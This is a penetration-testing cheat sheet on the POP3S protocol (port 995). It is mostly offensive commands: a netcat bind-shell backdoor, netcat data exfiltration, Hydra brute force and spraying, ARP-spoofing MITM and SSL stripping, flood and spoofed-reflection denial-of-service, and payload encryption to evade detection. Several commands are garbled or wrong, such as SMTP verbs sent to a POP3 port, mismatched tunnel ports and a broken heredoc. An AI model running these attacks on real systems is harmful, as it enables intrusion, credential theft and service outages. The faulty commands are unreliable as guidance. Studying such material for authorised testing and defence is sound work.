# Index
- [[Ports, Protocols, and Services]]
	- [[P110 POP3]]

# Post Office Protocol 3 Secure (POP3S)

- **Port Number:** 995
- **Protocol:** TCP
- **Service Name:** POP3S (Post Office Protocol 3 Secure)
- **Defined in:** RFC 2595 (for POP3S over SSL/TLS), RFC 1939 (for POP3)

Post Office Protocol 3 Secure (POP3S) is a secure version of the POP3 protocol, which is used to retrieve emails from a mail server. POP3S operates on port 995 and utilizes SSL/TLS to encrypt the communication between the email client and the server, providing confidentiality and integrity for email retrieval.

## Overview of Features

- **Email Retrieval:** POP3S is primarily used by email clients to download emails from a remote server to the local client. Once downloaded, emails are typically removed from the server, depending on client settings.

- **Encryption with SSL/TLS:** POP3S uses SSL (Secure Sockets Layer) or TLS (Transport Layer Security) to encrypt the communication, protecting the data in transit from eavesdropping and tampering.

- **Simple Authentication:** POP3S supports basic username and password authentication, which is encrypted during transmission due to the SSL/TLS layer.

- **Stateful Protocol:** POP3S maintains a session state between the client and server, managing user authentication and email retrieval commands within the session.

- **Support for Multiple Email Clients:** POP3S is widely supported by various email clients across different platforms, making it a standard protocol for secure email retrieval.

## Typical Use Cases

- **Secure Email Retrieval:** POP3S is commonly used by individuals and organizations to securely retrieve emails from a remote mail server to their local email client.

- **Email Backup:** Since POP3S downloads emails to the local client, it can be used as a method to back up emails from the server.

- **Compliance with Security Standards:** POP3S is often used in environments where email security is a priority, ensuring compliance with organizational or regulatory security standards.

## How POP3S Protocol Works

1. **Connection Establishment:**
   - **Step 1:** The email client initiates a TCP connection to the mail server on port 995.
   - **Step 2:** SSL/TLS negotiation occurs, where the server presents its digital certificate to the client. The client verifies the certificate to ensure it is connecting to the legitimate server.

2. **Client Authentication:**
   - **Step 3:** Once the SSL/TLS connection is established, the client sends its username and password, encrypted by the SSL/TLS layer.
   - **Step 4:** The server verifies the credentials and responds with a success message if the authentication is successful.

3. **Email Retrieval:**
   - **Step 5:** The client sends a `LIST` command to the server, requesting a list of available emails.
   - **Step 6:** The server responds with a list of emails, including their unique identifiers and sizes.
   - **Step 7:** The client may send a `RETR` command for each email it wishes to download.
   - **Step 8:** The server sends the requested email(s) to the client, still within the SSL/TLS encrypted session.

4. **Email Deletion:**
   - **Step 9:** If the client is configured to delete emails after retrieval, it sends a `DELE` command to the server for each email to be deleted.
   - **Step 10:** The server marks the emails for deletion, which will be removed after the session ends.

5. **Session Termination:**
   - **Step 11:** The client sends a `QUIT` command to terminate the session.
   - **Step 12:** The server responds with an acknowledgment, and the SSL/TLS connection is gracefully closed.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` connects to `<target_ip>`:995
- **Server:** `<target_ip>` provides SSL/TLS certificate and awaits encrypted login credentials.
- **Client:** `<attack_ip>` sends encrypted credentials, receives email list, retrieves emails, and optionally deletes them from the server.

# Additional Information

## Security Considerations
- **SSL/TLS Security:** The use of SSL/TLS provides a secure channel for email retrieval, protecting against eavesdropping and man-in-the-middle attacks. However, the security depends on the strength of the SSL/TLS configuration and the validity of the server’s certificate.

- **Backward Compatibility Issues:** Some older email clients may not fully support modern TLS versions or may use outdated ciphers, leading to potential security vulnerabilities.

- **Phishing and Man-in-the-Middle (MITM) Attacks:** Attackers may attempt to present a fake SSL/TLS certificate to intercept credentials. Ensuring the client properly validates the server's certificate is crucial.

## Alternatives
- **IMAPS (IMAP Secure):** Another secure email retrieval protocol that operates over port 993. Unlike POP3S, IMAPS allows for email management on the server, enabling clients to sync and manage messages without downloading them all locally.
  
- **Web-Based Email:** Many users now access email through web browsers over HTTPS, which inherently provides SSL/TLS encryption.

## Modes of Operation
- **Pull Mode:** POP3S operates in a pull mode, where the client actively connects to the server to retrieve emails. This is different from push-based email delivery systems like IMAP IDLE or ActiveSync.

- **Configuration for Multiple Devices:** POP3S is less ideal for use on multiple devices due to its nature of downloading and often deleting emails from the server. IMAP is preferred in multi-device environments.

## Configuration Files

1. **Dovecot Configuration (Linux-based Mail Server):**
   - **File Location:** `/etc/dovecot/dovecot.conf`
   - **Configuration Example:**
     ```bash
     protocols = pop3s
     ssl = yes
     ssl_cert = </etc/ssl/certs/mailserver.pem
     ssl_key = </etc/ssl/private/mailserver.key
     service pop3-login {
         inet_listener pop3s {
             port = 995
             ssl = yes
         }
     }
     ```
   - **Key Settings:**
     - `protocols`: Defines the protocols that Dovecot should support.
     - `ssl`: Enables SSL/TLS for secure communication.
     - `ssl_cert`: Specifies the path to the SSL certificate.
     - `ssl_key`: Specifies the path to the SSL key.
     - `inet_listener`: Configures the listener for the POP3S service, including the port and SSL setting.

2. **Postfix Configuration (Linux-based Mail Server):**
   - **File Location:** `/etc/postfix/main.cf`
   - **Configuration Example:**
     ```bash
     smtpd_tls_cert_file=/etc/ssl/certs/mailserver.pem
     smtpd_tls_key_file=/etc/ssl/private/mailserver.key
     smtpd_use_tls=yes
     ```
   - **Key Settings:**
     - `smtpd_tls_cert_file`: Specifies the path to the SSL certificate for TLS.
     - `smtpd_tls_key_file`: Specifies the path to the private key for TLS.
     - `smtpd_use_tls`: Enables TLS for the Postfix server.

3. **Client Configuration (Thunderbird, Outlook):**
   - **Setting:**
     - **Server Type:** POP3S
     - **Server Address:** `<target_ip>`
     - **Port:** 995
     - **Connection Security:** SSL/TLS
     - **Authentication Method:** Normal Password
   - **Example:**
     ```
     Incoming Mail Server: pop3s.example.com
     Port: 995
     Connection Security: SSL/TLS
     Authentication Method: Normal Password
     ```

## Potential Misconfigurations

1. **Weak SSL/TLS Configuration:**
   - **Risk:** Using outdated SSL/TLS versions or weak cipher suites can compromise the security of the communication.
   - **Exploitation:** An attacker can exploit weak SSL/TLS settings to decrypt the communication or perform man-in-the-middle attacks.
   - **Mitigation:** Ensure that the server is configured to use strong TLS versions (e.g., TLS 1.2 or 1.3) and disable weak ciphers.

2. **Improper Certificate Management:**
   - **Risk:** Expired, self-signed, or improperly configured certificates can lead to clients not validating the server correctly, opening the door to MITM attacks.
   - **Exploitation:** An attacker can present a fake certificate to intercept the connection and capture credentials.
   - **Mitigation:** Use certificates from trusted Certificate Authorities (CAs) and ensure they are properly configured and up-to-date.

3. **No Email Deletion Post-Retrieval:**
   - **Risk:** If the client is configured to leave emails on the server after retrieval, sensitive data may accumulate on the server, increasing the risk of data breaches.
   - **Exploitation:** An attacker who gains access to the server could download all the accumulated emails.
   - **Mitigation:** Configure the client to delete emails after retrieval or periodically clean up the server.

## Default Credentials

- **Username:** Often the full email address (e.g., `user@example.com`).
- **Password:** User-defined during email account setup.

However, default credentials might be found in some misconfigured or default installations of mail servers, such as:

- **Username:** `admin`
- **Password:** `admin` or `password`

# Interaction and Tools

## Tools

### [[Telnet]]
- **Telnet Connect:** Establishes a connection to the specified IP.
	```bash
	telnet <target_ip> 110
	```
- **Authentication:** Logs in to the POP3 server using the provided username and password.
    ```bash
    USER username
    PASS password
    ```
- **Retrieve Emails:** Retrieves the specified email from the server.
	```bash
	RETR <message_number>
	```
- **Delete Emails:** Marks the specified email for deletion.
	```bash
	DELE <message_number>
	```
- **Quit Session:** Terminates the POP3 session, applying any changes such as deletions.
	```bash
	QUIT
	```
- **Checking Mailbox Status:** Returns the number of messages in the mailbox and the total size.
	```bash
	STAT
	```
- **List All Messages:** Lists all messages in the mailbox with their sizes.
	```bash
	LIST
	```
- **View Message Headers:** Retrieves the headers and the first `n` lines of the specified email, useful for inspecting without downloading the full content.
	```bash
	TOP <message_number> <n>
	```

### [[Stunnel]]
- **Create a Secure Tunnel:** Creating secure tunnels for services like IMAPS, allowing you to connect to them via tools like Telnet or NetCat.
    ```bash
    stunnel -d 127.0.0.1:587 -r <target_ip>:995
    ```
- **Telnet via Stunnel (for IMAPS):** Creates a secure tunnel using Stunnel and then connects to it via Telnet, simulating an SMTPS connection.
    ```bash
    stunnel -d 127.0.0.1:587 -r <target_ip>:995
    telnet 127.0.0.1 995
    ```

### [[OpenSSL]]
- **Connect:** Establish an SSL/TLS encrypted connection to a POP3 server on port 995.
    ```bash
    openssl s_client -connect <target_ip>:995
    openssl s_client -connect <target_ip>:110 -starttls pop3
    ```
- **Check SSL/TLS Certificate:**
	```bash
	openssl s_client -connect <target_ip>:993 -showcerts
	```

### [[cURL]]
- **Connect to POP3 with username and password:**
	```bash
	curl -k 'pop3://<target_ip>' --user <username>:<password>
	```
- **Use Verbose:** Display additional information on the connection
	```bash
	curl -k 'pop3://<target_ip>' --user <username>:<password> -v
	```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 995"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 995
    ```

### [[NetCat]]
 - **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 995
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 995 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 995
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
    nc <target_ip> 995 < secret_data.txt
    ```

### [[SoCat Cheat Sheet]]
- **SoCat TCP Connect:** Simple tests to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:995
	```

### [[HPing3 Cheat Sheet]]
- **Send Packet:** Send TCP packet to the service. Use `-2` to send UDP packet.
    ```bash
    hping3 <target_ip> -p 995
    ```

### [[SSLScan]]
- **Scan Target:** Detailed analysis of an HTTPS service’s SSL/TLS configuration.
    ```bash
    sslscan <target_ip>:995
    ```

### [[SSLyze]]
- **Scan Target:** Automated testing and reporting on the security of an HTTPS service.
    ```bash
    sslyze --regular <target_ip>:995
    ```

### [[SSLStrip Cheat Sheet]]
- **SSL Downgrade:**
	```bash
	sslstrip -l 995
	```

### [[NetExec]]
### [[CrackMapExec]]
- **Connect via username/password:**
	```bash
	crackmapexec pop3s <target_ip> -u <username> -p <password>
	```

### Wireshark with Decryption
 - **Description:** If the SSL/TLS private keys are available, Wireshark can be used to decrypt POP3S traffic.
     - **Import SSL/TLS Keys:**
       ```
       Edit -> Preferences -> Protocols -> SSL -> (Pre-)Master-Secret log filename
       ```
     - **Filter POP3S Traffic:**
       ```
       tcp.port == 995
       ```

## Other Techniques

### Using Email Clients to access POP3
- **Description:** Leverage GUI email clients to access POP3.
	- **[[Evolution]]**
	- **[[Thunderbird]]**
	- **[[Microsoft Outlook]]**

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 995
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 995
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

### Certificate Information Gathering
- **Tool:** [[OpenSSL]]
    ```bash
    openssl s_client -connect <target_ip>:995 -showcerts
    ```
- **Description:** Retrieves and displays the server’s certificate chain, useful for identifying the certificate authority and the strength of the encryption.

## Initial Access

### Exploiting Weak SSL/TLS Configurations
- **Tool:** [[SSLScan]]
     ```bash
     sslscan <target_ip>:995
     ```
 - **Description:** Identifies weak SSL/TLS configurations that could be exploited to intercept or decrypt traffic.

## Persistence

### Maintain Access via POP3S Backdoor
- **Tool:** [[NetCat]]
     ```bash
     nc -l -p 995 -e /bin/sh
     ```
 - **Description:** A backdoor can be maintained on the POP3S port if the service is improperly secured.

## Credential Harvesting

### Packet Capture
- **Tool:** [[Wireshark]]
    ```bash
    wireshark -i <interface> -f "tcp port <port>"
    ```
- **Description:** Capture traffic and extract plaintext credentials.

### Man-in-the-Middle (MITM) Attack
- **Tool:** [[BetterCap Cheat Sheet]]
	```bash
	bettercap -iface <interface> -T <target_ip> --proxy
	```
- **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

### SSL Strip Attack
- **Tool:** [[BetterCap Cheat Sheet]], [[SSLStrip Cheat Sheet]]
    ```bash
    bettercap -iface <interface> -T <target_ip> --proxy
    
    sslstrip -l 995
    ```
- **Description:** Stripping SSL from connections in a man-in-the-middle attack, forcing clients to connect over unencrypted channels.

## Privilege Escalation

### Abuse of Privileged Accounts
- **Tool:** [[Custom Scripts]]
    ```bash
    echo "su root -c '/bin/sh'" | nc <target_ip> 110
    ```
- **Description:** If a privileged account is compromised, escalate privileges by executing commands with elevated rights.

### Abusing POP3S Admin Accounts
- **Tool:** [[Metasploit]]
     ```bash
     use auxiliary/scanner/pop3/pop3_login
     set USERNAME admin
     set PASSWORD admin123
     run
     ```
- **Description:** If admin-level credentials are obtained via POP3S, they can be leveraged for privilege escalation on the mail server.

## Internal Reconnaissance

### Mailbox Enumeration
- **Tool:** [[NetCat]], [[Telnet]]
    ```bash
    echo "STAT" | nc <target_ip> 995
    ```
- **Description:** Enumerate mailbox details such as the number of messages and total size to gather information about the target’s email usage.

### Email Enumeration
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 995 --script pop3-brute --script-args userdb=<username_file>,passdb=<password_file>
    ```
- **Description:** Enumerate mailbox details such as the number of messages and total size to gather information about the target’s email usage.

### Email-based Pivoting
- **Tool:** [[Custom Scripts]], SMTP Relays
    ```bash
    echo "RETR 1" | nc <target_ip> 995 | grep -oE 'Received: from ([0-9]{1,3}\.){3}[0-9]{1,3}'
    ```
- **Description:** Extract internal IP addresses from email headers to identify potential lateral movement targets within the network.

## Defense Evasion

### Encrypting Malicious Payloads
- **Tool:** [[OpenSSL]]
     ```bash
     openssl enc -aes-256-cbc -salt -in payload.exe -out payload.enc
     ```
- **Description:** Encrypt malicious payloads before sending them via email through POP3S to avoid detection by security tools.

#### Low and Slow Attacks
- **Tool:** [[Custom Scripts]]
    ```bash
    for i in {1..1000}; do echo "USER user$i" | nc <target_ip> 995; sleep 60; done
    ```
- **Description:** Slowly enumerate users or attempt logins to avoid triggering rate-limiting or intrusion detection systems.

## Data Exfiltration

### Exfiltration via Email
- **Tool:** [[Custom Scripts]]
    ```bash
    echo "MAIL FROM: attacker@domain.com\nRCPT TO: victim@target.com\nDATA\nexfiltrated_data\n." | nc <target_ip> 995
    ```
- **Description:** Exfiltrate sensitive data by sending it via email to an external account, potentially using compromised POP3 credentials.

### Exfiltrating Data via Email Attachments
- **Tool:** [[Custom Scripts]]
     ```bash
     openssl s_client -connect <target_ip>:995 EOF
     USER <username>
     PASS <password>
     RETR <message_number>
     EOF
     ```
 - **Description:** Retrieve sensitive emails or attachments from the mail server and exfiltrate them via POP3.

# Exploits and Attacks

## Password Attacks

### Password Brute Force
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra pop3s://<target_ip> -s 995 -l <username> -P <password_list>
    ```
- **Description:** Test a single username against multiple passwords.

### Password Spray
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra pop3s://<target_ip> -s 995 -l <username_list> -P <password>
    ```
- **Description:** Test a multiple usernames against a single password.

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p 995 --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p 995 --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

### SSL/TLS Handshake Flood
- **Tool:** [[OpenSSL]]
     ```bash
     while true; do openssl s_client -connect <target_ip>:995 & done
     ```
- **Description:** Floods the service with SSL/TLS handshake requests, overwhelming the server.

### Malformed Packet Injection
- **Tool:** [[Scapy]]
	```python
	from scapy.all import *
	send(IP(dst="<target_ip>")/TCP(dport=995, flags="S")/Raw(load="malformed_data"))
	```
- **Description:** Sends malformed packets to the POP3S service, potentially causing it to crash.

## Exploits 

### Heartbleed (CVE-2014-0160)
- **Tool:** [[Nmap]]
    ```bash
    nmap --script ssl-heartbleed -p 995 <target_ip>
    ```
- **Description:** Exploiting the Heartbleed vulnerability in OpenSSL to extract sensitive information from the server's memory.

### POODLE (Padding Oracle On Downgraded Legacy Encryption)
- **Tool:** [[Nmap]]
    ```bash
    nmap --script ssl-poodle -p 995 <target_ip>
    ```
- **Description:** Exploit the POODLE vulnerability by forcing a downgrade to SSL 3.0 and performing a padding oracle attack.

### DROWN (CVE-2016-0800)
- **Tool:** [[Nmap]]
	```bash
	nmap --script ssl-drown -p 995 <target_ip>
	```
- **Description:** Exploit the DROWN vulnerability by attacking servers that support both SSLv2 and TLS, potentially decrypting secure connections.

### SSL/TLS Downgrade Attack
- **Tool:** [[BetterCap Cheat Sheet]], [[SSLStrip Cheat Sheet]]
     ```bash
     bettercap -iface <interface> -T <target_ip> --proxy
     
     sslstrip -l 995
     ```
- **Description:** Forces a downgrade of the SSL/TLS connection to a weaker protocol that can be exploited or decrypted.

# Resources

|**Website**|**URL**|
| - | - |
|RFC 2595 (POP3S)|https://tools.ietf.org/html/rfc2595|
|RFC 1939 (POP3)|https://tools.ietf.org/html/rfc1939|
|OpenSSL Documentation|https://www.openssl.org/docs/man1.1.1/man1/openssl.html|
|Hydra GitHub|https://github.com/vanhauser-thc/thc-hydra|
|Wireshark User Guide|https://www.wireshark.org/docs/wsug_html_chunked/|
|Metasploit Framework|https://www.metasploit.com|
|Scapy Documentation|https://scapy.readthedocs.io/en/latest/|
|SSLyze Documentation|https://github.com/nabla-c0d3/sslyze|
|Bettercap Documentation|https://www.bettercap.org/docs/|
|Dovecot Wiki|https://wiki.dovecot.org/|
